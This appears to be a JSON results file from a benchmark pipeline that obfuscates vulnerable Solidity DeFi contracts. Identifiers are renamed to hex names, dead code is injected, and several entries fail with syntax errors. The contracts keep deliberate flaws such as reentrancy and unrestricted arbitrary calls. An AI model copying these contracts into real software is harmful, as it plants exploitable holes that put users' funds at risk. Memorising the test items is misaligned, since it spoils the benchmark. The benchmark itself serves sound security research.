> 0) {\n                _0x5c7aad -= int256(_0x237bca);\n            } else {\n                _0x5c7aad += int256(_0xa5b4ce);\n            }\n        }\n\n        // Update state\n        _0x98210f = _0x29cba0;\n        _0x5775c9 = _0x1aa684;\n        _0x77884e = _0x655a87;\n\n        return (_0xd9da08, _0xb4df9c);\n    }\n\n    /**\n     * @notice Add signed liquidity value\n     */\n    function _0x77d406(\n        uint128 x,\n        int128 y\n    ) internal pure returns (uint128 z) {\n        if (y < 0) {\n            z = x - uint128(-y);\n        } else {\n            z = x + uint128(y);\n        }\n    }\n\n    /**\n     * @notice Calculate amounts for liquidity\n     */\n    function _0x9d1a94(\n        uint160 _0x0b589c,\n        int24 _0xb408d7,\n        int24 _0xabde90,\n        int128 _0x490838\n    ) internal pure returns (uint256 _0xd9da08, uint256 _0xb4df9c) {\n        _0xd9da08 = uint256(uint128(_0x490838)) / 2;\n        _0xb4df9c = uint256(uint128(_0x490838)) / 2;\n    }\n\n    /**\n     * @notice Compute single swap step\n     */\n    function _0xfe511e(\n        uint160 _0x1f8feb,\n        uint160 _0x63fe8a,\n        uint128 _0x5bfc4b,\n        int256 _0xe7c894\n    )\n        internal\n        pure\n        returns (uint256 _0x237bca, uint256 _0xa5b4ce, uint160 _0x5d6cf0)\n    {\n        _0x237bca =\n            uint256(_0xe7c894 > 0 ? _0xe7c894 : -_0xe7c894) /\n            2;\n        _0xa5b4ce = _0x237bca;\n        _0x5d6cf0 = _0x1f8feb;\n    }\n\n    /**\n     * @notice Get tick at sqrt ratio\n     */\n    function _0x5fd909(\n        uint160 _0x98210f\n    ) internal pure returns (int24 _0xf8c058) {\n        return int24(int256(uint256(_0x98210f >> 96)));\n    }\n}\n",
      "rename_map": {
        "sqrtPriceCurrentX96": "_0x1f8feb",
        "_getTickAtSqrtRatio": "_0x5fd909",
        "sqrtPriceX96Target": "_0x60636b",
        "sqrtPriceTargetX96": "_0x63fe8a",
        "liquidityNetAtTick": "_0x6bf30b",
        "sqrtPriceLimitX96": "_0x6c8fc8",
        "_calculateAmounts": "_0x9d1a94",
        "_computeSwapStep": "_0xfe511e",
        "sqrtPriceNextX96": "_0x5d6cf0",
        "liquidityCurrent": "_0x5bfc4b",
        "sqrtPriceX96Next": "_0x29cba0",
        "amountRemaining": "_0xe7c894",
        "amountSpecified": "_0x5c7aad",
        "liquidityDelta": "_0x490838",
        "_addLiquidity": "_0x77d406",
        "liquidityNext": "_0x1aa684",
        "addLiquidity": "_0x471260",
        "sqrtPriceX96": "_0x98210f",
        "encodePacked": "_0xca3b7d",
        "liquidityNet": "_0x40a392",
        "currentTick": "_0x77884e",
        "tickCrossed": "_0x79a2e3",
        "positionKey": "_0x07d640",
        "amount1Out": "_0xec4f70",
        "zeroForOne": "_0x445577",
        "amount0Out": "_0xb12688",
        "amount1In": "_0x7d01e3",
        "liquidity": "_0x5775c9",
        "amountOut": "_0xa5b4ce",
        "sqrtPrice": "_0x0b589c",
        "positions": "_0x625ab0",
        "tickUpper": "_0xabde90",
        "keccak256": "_0x9108c9",
        "amount0In": "_0x951e20",
        "tickLower": "_0xb408d7",
        "position": "_0x37893a",
        "provider": "_0xfb8d11",
        "amountIn": "_0x237bca",
        "tickNext": "_0x655a87",
        "amount1": "_0xb4df9c",
        "amount0": "_0xd9da08",
        "token0": "_0x15a9fe",
        "token1": "_0x91f088",
        "swap": "_0xcbc924",
        "tick": "_0xf8c058"
      },
      "changes": [
        "Renamed 45 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_tc_010",
      "transformed_id": "ss_l4_medium_sn_tc_010",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.4.19;\n\n/**\n * @title Credit System Contract\n * @notice Manages deposits and withdrawals\n */\ncontract CreditSystem {\n    mapping(address => uint256) public _0x453853;\n    uint256 public balance;\n\n    function _0xcac5a4() public payable {\n        bool _flag1 = false;\n        bool _flag2 = false;\n        _0x453853[msg.sender] += msg.value;\n        balance += msg.value;\n    }\n\n    function _0x50b148() public {\n        if (false) { revert(); }\n        if (false) { revert(); }\n        uint256 _0xe3a4cd = _0x453853[msg.sender];\n        if (_0xe3a4cd > 0) {\n            balance -= _0xe3a4cd;\n            bool _0x99ef1f = msg.sender.call.value(_0xe3a4cd)();\n            require(_0x99ef1f);\n            _0x453853[msg.sender] = 0;\n        }\n    }\n\n    function _0xc2edb1(address _0x3c1342) public view returns (uint256) {\n        return _0x453853[_0x3c1342];\n    }\n}\n",
      "rename_map": {
        "withdrawAll": "_0x50b148",
        "callResult": "_0x99ef1f",
        "getCredit": "_0xc2edb1",
        "deposit": "_0xcac5a4",
        "oCredit": "_0xe3a4cd",
        "credit": "_0x453853",
        "user": "_0x3c1342"
      },
      "changes": [
        "Renamed 7 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_tc_011",
      "transformed_id": "ss_l4_medium_sn_tc_011",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": false,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/**\n * @title Lending Pool Contract\n * @notice Manages token supplies and withdrawals\n */\n\ninterface IERC777 {\n    function transfer(address _0xfb041f, uint256 _0xf567e8) external returns (bool);\n\n    function _0x37c8c7(address _0x5bcc00) external view returns (uint256);\n}\n\ninterface IERC1820Registry {\n        uint256 _unused1 = 0;\n        if (false) { revert(); }\n    function _0xae7f37(\n        address _0x5bcc00,\n        bytes32 _0x97eea3,\n        address _0x825b35\n    ) external;\n}\n\ncontract LendingPool {\n        uint256 _unused3 = 0;\n        if (false) { revert(); }\n    mapping(address => mapping(address => uint256)) public _0xc0a13a;\n    mapping(address => uint256) public _0x469ccc;\n\n    function _0xb969d5(address _0x265484, uint256 _0xf567e8) external returns (uint256) {\n        IERC777 _0x1d96bb = IERC777(_0x265484);\n\n        require(_0x1d96bb.transfer(address(this), _0xf567e8), \"Transfer failed\");\n\n        _0xc0a13a[msg.sender][_0x265484] += _0xf567e8;\n        _0x469ccc[_0x265484] += _0xf567e8;\n\n        return _0xf567e8;\n    }\n\n    function _0x23dc99(\n        address _0x265484,\n        uint256 _0x0527d3\n    ) external returns (uint256) {\n        uint256 _0x807961 = _0xc0a13a[msg.sender][_0x265484];\n        require(_0x807961 > 0, \"No balance\");\n\n        uint256 _0xc518fd = _0x0527d3;\n        if (_0x0527d3 == type(uint256)._0x901e29) {\n            _0xc518fd = _0x807961;\n        }\n        require(_0xc518fd <= _0x807961, \"Insufficient balance\");\n\n        IERC777(_0x265484).transfer(msg.sender, _0xc518fd);\n\n        _0xc0a13a[msg.sender][_0x265484] -= _0xc518fd;\n        _0x469ccc[_0x265484] -= _0xc518fd;\n\n        return _0xc518fd;\n    }\n\n    function _0xadf72b(\n        address _0xc65941,\n        address _0x265484\n    ) external view returns (uint256) {\n        return _0xc0a13a[_0xc65941][_0x265484];\n    }\n}\n",
      "rename_map": {
        "setInterfaceImplementer": "_0xae7f37",
        "requestedAmount": "_0x0527d3",
        "withdrawAmount": "_0xc518fd",
        "interfaceHash": "_0x97eea3",
        "totalSupplied": "_0x469ccc",
        "getSupplied": "_0xadf72b",
        "implementer": "_0x825b35",
        "userBalance": "_0x807961",
        "balanceOf": "_0x37c8c7",
        "supplied": "_0xc0a13a",
        "withdraw": "_0x23dc99",
        "account": "_0x5bcc00",
        "amount": "_0xf567e8",
        "supply": "_0xb969d5",
        "token": "_0x1d96bb",
        "asset": "_0x265484",
        "user": "_0xc65941",
        "max": "_0x901e29",
        "to": "_0xfb041f"
      },
      "changes": [
        "Renamed 19 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": "Syntax errors after transformation: ['Syntax error at line 17, column 9', 'Syntax error at line 23, column 1', 'Syntax error at line 27, column 9']"
    },
    {
      "original_id": "sn_tc_012",
      "transformed_id": "ss_l4_medium_sn_tc_012",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/**\n * @title Lending Protocol\n * @notice Manages collateral deposits and borrowing\n */\n\ninterface IComptroller {\n    function _0x6df14c(\n        address[] memory _0x34a84b\n    ) external returns (uint256[] memory);\n\n    function _0x7af7f7(address _0x8a6e2c) external returns (uint256);\n\n    function _0xe5dba5(\n        address _0xc1c62e\n    ) external view returns (uint256, uint256, uint256);\n}\n\ncontract LendingProtocol {\n        uint256 _unused1 = 0;\n        uint256 _unused2 = 0;\n    IComptroller public _0x370824;\n\n    mapping(address => uint256) public _0x69b91f;\n    mapping(address => uint256) public _0x5860cd;\n    mapping(address => bool) public _0x61d878;\n\n    uint256 public _0x200cd0;\n    uint256 public _0xcd95ba;\n    uint256 public constant COLLATERAL_FACTOR = 150;\n\n    constructor(address _0xc01c6e) {\n        if (1 == 1) { _0x370824 = IComptroller(_0xc01c6e); }\n    }\n\n    function _0xcbce07() external payable {\n        uint256 _unused3 = 0;\n        uint256 _unused4 = 0;\n        _0x69b91f[msg.sender] += msg.value;\n        _0x200cd0 += msg.value;\n        _0x61d878[msg.sender] = true;\n    }\n\n    function _0x498fba(\n        address _0xc1c62e,\n        uint256 _0x3db187\n    ) public view returns (bool) {\n        uint256 _0x27bdb4 = _0x5860cd[_0xc1c62e] + _0x3db187;\n        if (_0x27bdb4 == 0) return true;\n\n        if (!_0x61d878[_0xc1c62e]) return false;\n\n        uint256 _0x364972 = _0x69b91f[_0xc1c62e];\n        return _0x364972 >= (_0x27bdb4 * COLLATERAL_FACTOR) / 100;\n    }\n\n    function _0x972797(uint256 _0x86df15) external {\n        require(_0x86df15 > 0, \"Invalid amount\");\n        require(address(this).balance >= _0x86df15, \"Insufficient funds\");\n\n        require(_0x498fba(msg.sender, _0x86df15), \"Insufficient collateral\");\n\n        _0x5860cd[msg.sender] += _0x86df15;\n        _0xcd95ba += _0x86df15;\n\n        (bool _0x93b314, ) = payable(msg.sender).call{value: _0x86df15}(\"\");\n        require(_0x93b314, \"Transfer failed\");\n\n        require(_0x498fba(msg.sender, 0), \"Health check failed\");\n    }\n\n    function _0x7af7f7() external {\n        require(_0x5860cd[msg.sender] == 0, \"Outstanding debt\");\n        _0x61d878[msg.sender] = false;\n    }\n\n    function _0x6a95c8(uint256 _0x86df15) external {\n        require(_0x69b91f[msg.sender] >= _0x86df15, \"Insufficient deposits\");\n        require(!_0x61d878[msg.sender], \"Exit market first\");\n\n        _0x69b91f[msg.sender] -= _0x86df15;\n        _0x200cd0 -= _0x86df15;\n\n        payable(msg.sender).transfer(_0x86df15);\n    }\n\n    receive() external payable {}\n}\n",
      "rename_map": {
        "depositAndEnterMarket": "_0xcbce07",
        "getAccountLiquidity": "_0xe5dba5",
        "additionalBorrow": "_0x3db187",
        "collateralValue": "_0x364972",
        "totalBorrowed": "_0xcd95ba",
        "totalDeposits": "_0x200cd0",
        "_comptroller": "_0xc01c6e",
        "enterMarkets": "_0x6df14c",
        "comptroller": "_0x370824",
        "exitMarket": "_0x7af7f7",
        "totalDebt": "_0x27bdb4",
        "isHealthy": "_0x498fba",
        "inMarket": "_0x61d878",
        "withdraw": "_0x6a95c8",
        "deposits": "_0x69b91f",
        "borrowed": "_0x5860cd",
        "cTokens": "_0x34a84b",
        "account": "_0xc1c62e",
        "success": "_0x93b314",
        "amount": "_0x86df15",
        "borrow": "_0x972797",
        "cToken": "_0x8a6e2c"
      },
      "changes": [
        "Renamed 22 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_tc_013",
      "transformed_id": "ss_l4_medium_sn_tc_013",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/**\n * @title Reward Minter Contract\n * @notice Manages LP token deposits and reward minting\n */\n\ninterface IERC20 {\n    function transfer(address _0x757d4d, uint256 _0x18b738) external returns (bool);\n\n    function _0x7c728c(\n        address from,\n        address _0x757d4d,\n        uint256 _0x18b738\n    ) external returns (bool);\n\n    function _0x423a4a(address _0x2834e0) external view returns (uint256);\n}\n\ninterface IPancakeRouter {\n        bool _flag1 = false;\n        uint256 _unused2 = 0;\n    function _0x82ca57(\n        uint _0x179639,\n        uint _0x69d6f8,\n        address[] calldata _0x678211,\n        address _0x757d4d,\n        uint _0x24835a\n    ) external returns (uint[] memory _0xea8ebb);\n}\n\ncontract RewardMinter {\n        uint256 _unused3 = 0;\n        bool _flag4 = false;\n    IERC20 public _0x364252;\n    IERC20 public _0x581bd6;\n\n    mapping(address => uint256) public _0x9417cd;\n    mapping(address => uint256) public _0x5c7123;\n\n    uint256 public constant REWARD_RATE = 100;\n\n    constructor(address _0xa837c6, address _0x996217) {\n        if (gasleft() > 0) { _0x364252 = IERC20(_0xa837c6); }\n        if (msg.sender != address(0) || msg.sender == address(0)) { _0x581bd6 = IERC20(_0x996217); }\n    }\n\n    function _0xd79f19(uint256 _0x18b738) external {\n        _0x364252._0x7c728c(msg.sender, address(this), _0x18b738);\n        _0x9417cd[msg.sender] += _0x18b738;\n    }\n\n    function _0x87a3eb(\n        address _0xfd94c3,\n        uint256 _0x49796b,\n        uint256 _0x7e7b62,\n        address _0x757d4d,\n        uint256\n    ) external {\n        require(_0xfd94c3 == address(_0x364252), \"Invalid token\");\n\n        uint256 _0x1a51ef = _0x7e7b62 + _0x49796b;\n        _0x364252._0x7c728c(msg.sender, address(this), _0x1a51ef);\n\n        uint256 _0x76d271 = _0x5f9ce4(\n            _0x364252._0x423a4a(address(this))\n        );\n\n        _0x5c7123[_0x757d4d] += _0x76d271;\n    }\n\n    function _0x5f9ce4(uint256 _0xfbb9ec) internal pure returns (uint256) {\n        return _0xfbb9ec * REWARD_RATE;\n    }\n\n    function _0x9b5207() external {\n        uint256 _0x53dd9b = _0x5c7123[msg.sender];\n        require(_0x53dd9b > 0, \"No rewards\");\n\n        _0x5c7123[msg.sender] = 0;\n        _0x581bd6.transfer(msg.sender, _0x53dd9b);\n    }\n\n    function _0xce4436(uint256 _0x18b738) external {\n        require(_0x9417cd[msg.sender] >= _0x18b738, \"Insufficient balance\");\n        _0x9417cd[msg.sender] -= _0x18b738;\n        _0x364252.transfer(msg.sender, _0x18b738);\n    }\n}\n",
      "rename_map": {
        "swapExactTokensForTokens": "_0x82ca57",
        "hunnyRewardAmount": "_0x76d271",
        "_performanceFee": "_0x7e7b62",
        "_withdrawalFee": "_0x49796b",
        "earnedRewards": "_0x5c7123",
        "tokenToReward": "_0x5f9ce4",
        "transferFrom": "_0x7c728c",
        "_rewardToken": "_0x996217",
        "rewardToken": "_0x581bd6",
        "depositedLP": "_0x9417cd",
        "balanceOf": "_0x423a4a",
        "amountOut": "_0x69d6f8",
        "getReward": "_0x9b5207",
        "lpAmount": "_0xfbb9ec",
        "deadline": "_0x24835a",
        "_lpToken": "_0xa837c6",
        "withdraw": "_0xce4436",
        "amountIn": "_0x179639",
        "account": "_0x2834e0",
        "deposit": "_0xd79f19",
        "amounts": "_0xea8ebb",
        "lpToken": "_0x364252",
        "mintFor": "_0x87a3eb",
        "amount": "_0x18b738",
        "feeSum": "_0x1a51ef",
        "reward": "_0x53dd9b",
        "path": "_0x678211",
        "flip": "_0xfd94c3",
        "to": "_0x757d4d"
      },
      "changes": [
        "Renamed 29 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_tc_014",
      "transformed_id": "ss_l4_medium_sn_tc_014",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": false,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/**\n * @title Vault Strategy Contract\n * @notice Manages deposits and automated yield strategies\n */\n\ninterface ICurve3Pool {\n    function _0x47fa32(\n        uint256[3] memory _0x4110be,\n        uint256 _0x7b0da6\n    ) external;\n\n    function _0x21f2f7(\n        uint256[3] memory _0x4110be,\n        uint256 _0x0eb598\n    ) external;\n\n    function _0x6f92d0() external view returns (uint256);\n}\n\ninterface IERC20 {\n        if (false) { revert(); }\n        if (false) { revert(); }\n    function transfer(address _0xa66ad8, uint256 _0x6e8349) external returns (bool);\n\n    function _0x0c11cd(\n        address from,\n        address _0xa66ad8,\n        uint256 _0x6e8349\n    ) external returns (bool);\n\n    function _0xfaca9e(address _0x0002dd) external view returns (uint256);\n\n    function _0x107e4d(address _0x8bb97c, uint256 _0x6e8349) external returns (bool);\n}\n\ncontract YieldVault {\n        if (false) { revert(); }\n        uint256 _unused4 = 0;\n    IERC20 public _0xcee8ab;\n    IERC20 public _0xae20b6;\n    ICurve3Pool public _0x8006c5;\n\n    mapping(address => uint256) public _0x5a6980;\n    uint256 public _0x5f2196;\n    uint256 public _0xb2c1e4;\n\n    uint256 public constant MIN_EARN_THRESHOLD = 1000 ether;\n\n    constructor(address _0x9e0b38, address _0xc12fc2, address _0x49562d) {\n        _0xcee8ab = IERC20(_0x9e0b38);\n        if (block.timestamp > 0) { _0xae20b6 = IERC20(_0xc12fc2); }\n        if (1 == 1) { _0x8006c5 = ICurve3Pool(_0x49562d); }\n    }\n\n    function _0x87c102(uint256 _0x6e8349) external {\n        _0xcee8ab._0x0c11cd(msg.sender, address(this), _0x6e8349);\n\n        uint256 _0xa54f68;\n        if (_0x5f2196 == 0) {\n            _0xa54f68 = _0x6e8349;\n        } else {\n            _0xa54f68 = (_0x6e8349 * _0x5f2196) / _0xb2c1e4;\n        }\n\n        _0x5a6980[msg.sender] += _0xa54f68;\n        _0x5f2196 += _0xa54f68;\n        _0xb2c1e4 += _0x6e8349;\n    }\n\n    function _0x246f88() external {\n        uint256 _0xd0a7e5 = _0xcee8ab._0xfaca9e(address(this));\n        require(\n            _0xd0a7e5 >= MIN_EARN_THRESHOLD,\n            \"Insufficient balance to earn\"\n        );\n\n        uint256 _0xc0dc07 = _0x8006c5._0x6f92d0();\n\n        _0xcee8ab._0x107e4d(address(_0x8006c5), _0xd0a7e5);\n        uint256[3] memory _0x4110be = [_0xd0a7e5, 0, 0];\n        _0x8006c5._0x47fa32(_0x4110be, 0);\n    }\n\n    function _0xae5afb() external {\n        uint256 _0x0a52ce = _0x5a6980[msg.sender];\n        require(_0x0a52ce > 0, \"No shares\");\n\n        uint256 _0xeb68a2 = (_0x0a52ce * _0xb2c1e4) / _0x5f2196;\n\n        _0x5a6980[msg.sender] = 0;\n        _0x5f2196 -= _0x0a52ce;\n        _0xb2c1e4 -= _0xeb68a2;\n\n        _0xcee8ab.transfer(msg.sender, _0xeb68a2);\n    }\n\n    function balance() public view returns (uint256) {\n        return\n            _0xcee8ab._0xfaca9e(address(this)) +\n            (_0xae20b6._0xfaca9e(address(this)) * _0x8006c5._0x6f92d0()) /\n            1e18;\n    }\n}\n",
      "rename_map": {
        "remove_liquidity_imbalance": "_0x21f2f7",
        "get_virtual_price": "_0x6f92d0",
        "max_burn_amount": "_0x0eb598",
        "min_mint_amount": "_0x7b0da6",
        "withdrawAmount": "_0xeb68a2",
        "add_liquidity": "_0x47fa32",
        "totalDeposits": "_0xb2c1e4",
        "transferFrom": "_0x0c11cd",
        "virtualPrice": "_0xc0dc07",
        "vaultBalance": "_0xd0a7e5",
        "totalShares": "_0x5f2196",
        "withdrawAll": "_0xae5afb",
        "_curve3Pool": "_0x49562d",
        "shareAmount": "_0xa54f68",
        "curve3Pool": "_0x8006c5",
        "userShares": "_0x0a52ce",
        "balanceOf": "_0xfaca9e",
        "approve": "_0x107e4d",
        "account": "_0x0002dd",
        "deposit": "_0x87c102",
        "amounts": "_0x4110be",
        "spender": "_0x8bb97c",
        "amount": "_0x6e8349",
        "shares": "_0x5a6980",
        "_crv3": "_0xc12fc2",
        "earn": "_0x246f88",
        "crv3": "_0xae20b6",
        "_dai": "_0x9e0b38",
        "dai": "_0xcee8ab",
        "to": "_0xa66ad8"
      },
      "changes": [
        "Renamed 30 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": "Syntax errors after transformation: ['Syntax error at line 24, column 9', 'Syntax error at line 25, column 9', 'Syntax error at line 37, column 1']"
    },
    {
      "original_id": "sn_tc_015",
      "transformed_id": "ss_l4_medium_sn_tc_015",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/**\n * @title Compound Market Token\n * @notice Represents claims on supplied assets\n */\n\ninterface IERC20 {\n    function transfer(address _0x7e00ca, uint256 _0xce82d6) external returns (bool);\n\n    function _0x260dce(address _0x0dc26f) external view returns (uint256);\n}\n\ncontract CompoundMarket {\n        // Placeholder for future logic\n        // Placeholder for future logic\n    address public _0x7979da;\n    address public _0xbdd637;\n\n    mapping(address => uint256) public _0xe6dfcf;\n    uint256 public _0xa71839;\n\n    address public constant OLD_TUSD =\n        0x8dd5fbCe2F6a956C3022bA3663759011Dd51e73E;\n    address public constant NEW_TUSD =\n        0x0000000000085d4780B73119b644AE5ecd22b376;\n\n    constructor() {\n        _0xbdd637 = msg.sender;\n        if (block.timestamp > 0) { _0x7979da = OLD_TUSD; }\n    }\n\n    function _0x2ef630(uint256 _0xce82d6) external {\n        // Placeholder for future logic\n        if (false) { revert(); }\n        IERC20(NEW_TUSD).transfer(address(this), _0xce82d6);\n        _0xe6dfcf[msg.sender] += _0xce82d6;\n        _0xa71839 += _0xce82d6;\n    }\n\n    function _0xf15cea(address _0x42be07) external {\n        require(_0x42be07 != _0x7979da, \"Cannot sweep underlying token\");\n\n        uint256 balance = IERC20(_0x42be07)._0x260dce(address(this));\n        IERC20(_0x42be07).transfer(msg.sender, balance);\n    }\n\n    function _0xd225ed(uint256 _0xce82d6) external {\n        require(_0xe6dfcf[msg.sender] >= _0xce82d6, \"Insufficient balance\");\n\n        _0xe6dfcf[msg.sender] -= _0xce82d6;\n        _0xa71839 -= _0xce82d6;\n\n        IERC20(NEW_TUSD).transfer(msg.sender, _0xce82d6);\n    }\n}\n",
      "rename_map": {
        "accountTokens": "_0xe6dfcf",
        "totalSupply": "_0xa71839",
        "sweepToken": "_0xf15cea",
        "underlying": "_0x7979da",
        "balanceOf": "_0x260dce",
        "account": "_0x0dc26f",
        "amount": "_0xce82d6",
        "redeem": "_0xd225ed",
        "token": "_0x42be07",
        "admin": "_0xbdd637",
        "mint": "_0x2ef630",
        "to": "_0x7e00ca"
      },
      "changes": [
        "Renamed 12 identifiers using hex style",
        "Wrapped assignment in conditional",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": null
    },
    {
      "original_id": "sn_tc_016",
      "transformed_id": "ss_l4_medium_sn_tc_016",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": false,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/**\n * @title Loan Token Contract\n * @notice Represents interest-bearing tokens for supplied assets\n */\n\ninterface IERC20 {\n    function transfer(address _0x8647c0, uint256 _0x03b246) external returns (bool);\n\n    function _0x3b2503(address _0x65dbd7) external view returns (uint256);\n}\n\ncontract LoanToken {\n        if (false) { revert(); }\n        uint256 _unused2 = 0;\n    string public _0xaca614 = \"iETH\";\n    string public _0xd49846 = \"iETH\";\n\n    mapping(address => uint256) public _0xb98638;\n    uint256 public _0xabc227;\n    uint256 public _0xf0e9de;\n    uint256 public _0x15505e;\n\n    function _0x679d33(\n        address _0x96fa5f\n    ) external payable returns (uint256 _0xff1cfb) {\n        // Placeholder for future logic\n        uint256 _unused4 = 0;\n        uint256 _0x1376b4 = _0x21ebdb();\n        _0xff1cfb = (msg.value * 1e18) / _0x1376b4;\n\n        _0xb98638[_0x96fa5f] += _0xff1cfb;\n        _0xabc227 += _0xff1cfb;\n        _0x15505e += msg.value;\n\n        return _0xff1cfb;\n    }\n\n    function transfer(address _0x8647c0, uint256 _0x03b246) external returns (bool) {\n        require(_0xb98638[msg.sender] >= _0x03b246, \"Insufficient balance\");\n\n        _0xb98638[msg.sender] -= _0x03b246;\n        _0xb98638[_0x8647c0] += _0x03b246;\n\n        _0x1acda9(msg.sender, _0x8647c0, _0x03b246);\n\n        return true;\n    }\n\n    function _0x1acda9(\n        address from,\n        address _0x8647c0,\n        uint256 _0x03b246\n    ) internal {\n        if (_0x6e55b5(_0x8647c0)) {\n            (bool _0x01363a, ) = _0x8647c0.call(\"\");\n            _0x01363a;\n        }\n    }\n\n    function _0x5ab891(\n        address _0x96fa5f,\n        uint256 _0x03b246\n    ) external returns (uint256 _0xe9e1d2) {\n        require(_0xb98638[msg.sender] >= _0x03b246, \"Insufficient balance\");\n\n        uint256 _0x1376b4 = _0x21ebdb();\n        _0xe9e1d2 = (_0x03b246 * _0x1376b4) / 1e18;\n\n        _0xb98638[msg.sender] -= _0x03b246;\n        _0xabc227 -= _0x03b246;\n        _0x15505e -= _0xe9e1d2;\n\n        payable(_0x96fa5f).transfer(_0xe9e1d2);\n\n        return _0xe9e1d2;\n    }\n\n    function _0x21ebdb() internal view returns (uint256) {\n        if (_0xabc227 == 0) {\n            return 1e18;\n        }\n        return (_0x15505e * 1e18) / _0xabc227;\n    }\n\n    function _0x6e55b5(address _0x65dbd7) internal view returns (bool) {\n        uint256 _0x353f9d;\n        assembly {\n            _0x353f9d := extcodesize(_0x65dbd7)\n        }\n        return _0x353f9d > 0;\n    }\n\n    function _0x3b2503(address _0x65dbd7) external view returns (uint256) {\n        return _0xb98638[_0x65dbd7];\n    }\n\n    receive() external payable {}\n}\n",
      "rename_map": {
        "totalAssetBorrow": "_0xf0e9de",
        "totalAssetSupply": "_0x15505e",
        "_notifyTransfer": "_0x1acda9",
        "mintWithEther": "_0x679d33",
        "currentPrice": "_0x1376b4",
        "totalSupply": "_0xabc227",
        "_isContract": "_0x6e55b5",
        "burnToEther": "_0x5ab891",
        "_tokenPrice": "_0x21ebdb",
        "mintAmount": "_0xff1cfb",
        "balanceOf": "_0x3b2503",
        "ethAmount": "_0xe9e1d2",
        "receiver": "_0x96fa5f",
        "balances": "_0xb98638",
        "account": "_0x65dbd7",
        "success": "_0x01363a",
        "amount": "_0x03b246",
        "symbol": "_0xd49846",
        "size": "_0x353f9d",
        "name": "_0xaca614",
        "to": "_0x8647c0"
      },
      "changes": [
        "Renamed 21 identifiers using hex style",
        "Injected dead code after function start",
        "Injected dead code after function start"
      ],
      "stats": {},
      "error": "Syntax errors after transformation: ['Syntax error at line 16, column 9', 'Syntax error at line 17, column 9', 'Syntax error at line 100, column 5']"
    },
    {
      "original_id": "sn_tc_017",
      "transformed_id": "ss_l4_medium_sn_tc_017",
      "level": "l4",
      "variant": "medium",
      "source": "sanitized",
      "success": true,
      "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/**\n * @title Vault Controller Contract\n * @notice Manages vault strategies and token swaps\n */\n\ninterface IERC20 {\n    function transfer(address _0x65873a, uint256 _0xa8ca0f) external returns (bool);\n\n    function _0x3e3aa8(address _0x2887ab) external view returns (uint256);\n}\n\ninterface IJar {\n        uint256 _unused1 = 0;\n        // Placeholder for future logic\n    function _0x520b87() external view returns (address);\n\n    function _0xb1e289(uint256 _0xa8ca0f) external;\n}\n\ninterface IStrategy {\n        // Placeholder for future logic\n        uint256 _unused4 = 0;\n    function _0x656726() external;\n\n    function _0xb1e289(address _0x520b87) external;\n}\n\ncontract VaultController {\n    address public _0xa92300;\n    mapping(address => address) public _0xeff524;\n\n    constructor() {\n        _0xa92300 = msg.sender;\n    }\n\n    function _0x1c4d54(\n        address _0xa7a76b,\n        address _0xebdca0,\n        uint256 _0xa26578,\n        uint256 _0xcdcf7d,\n        address[] calldata _0x562655,\n        bytes[] calldata _0x730ad8\n    ) external {\n        require(_0x562655.length == _0x730ad8.length, \"Length mismatch\");\n\n        for (uint256 i = 0; i < _0x562655.length; i++) {\n            (bool _0x09959e, ) = _0x562655[i].call(_0x730ad8[i]);\n            require(_0x09959e, \"Call failed\");\n        }\n    }\n\n    function _0x68de10(address _0xcfa052, address _0x82636f) external {\n        require(msg.sender == _0xa92300, \"Not governance\");\n        _0xeff524[_0xcfa052] = _0x82636f;\n    }\n}\n\ncontract Strategy {\n    address public _0xc41320;\n    address public _0x6b3728;\n\n    constructor(address _0x951e5b, address _0x3b0214) {\n        _0xc41320 = _0x951e5b;\n        _0x6b3728 = _0x3b0214;\n    }\n\n    function _0x656726() external {\n        uint256 balance = IERC20(_0x6b3728)._0x3e3aa8(address(this));\n        IERC20(_0x6b3728).transfer(_0xc41320, balance);\n    }\n\n    function _0xb1e289(address _0x520b87) external {\n        uint256 balance = IERC20(_0x520b87)._0x3e3aa8(address(this));\n        IERC20(_0x520b87).transfer(_0xc41320, balance);\n    }\n}\n",
      "rename_map": {
        "swapExactJarForJar": "_0x1c4d54",
        "_toJarMinAmount": "_0xcdcf7d",
        "_fromJarAmount": "_0xa26578",
        "withdrawAll": "_0x656726",
        "_controller": "_0x951e5b",
        "setStrategy": "_0x68de10",
        "strategies": "_0xeff524",
        "controller": "_0xc41320",
        "governance": "_0xa92300",
        "balanceOf": "_0x3e3aa8",
        "_targets": "_0x562655",
        "withdraw": "_0xb1e289",
        "_fromJar": "_0xa7a76b",
        "strategy": "_0x82636f",
        "account": "_0x2887ab",
        "success": "_0x09959e",
